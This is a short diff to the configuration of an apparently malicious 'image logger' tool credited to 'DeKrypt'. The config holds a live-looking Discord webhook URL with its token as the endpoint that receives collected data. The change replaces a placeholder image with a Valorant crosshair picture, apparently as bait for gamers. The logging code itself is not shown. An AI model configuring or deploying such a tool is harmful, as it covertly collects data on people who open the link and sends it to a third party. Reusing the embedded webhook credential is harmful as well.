@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335649269989900328/uvJeV-grYnOrfNaR66VuQ3MjQeemAgTupK7mxmgG4HBj2t9qFdLn06sxPl9-n1q5pBQT",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://valo2asia.com/wp-content/uploads/2022/10/best-valorant-crosshair-sun.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
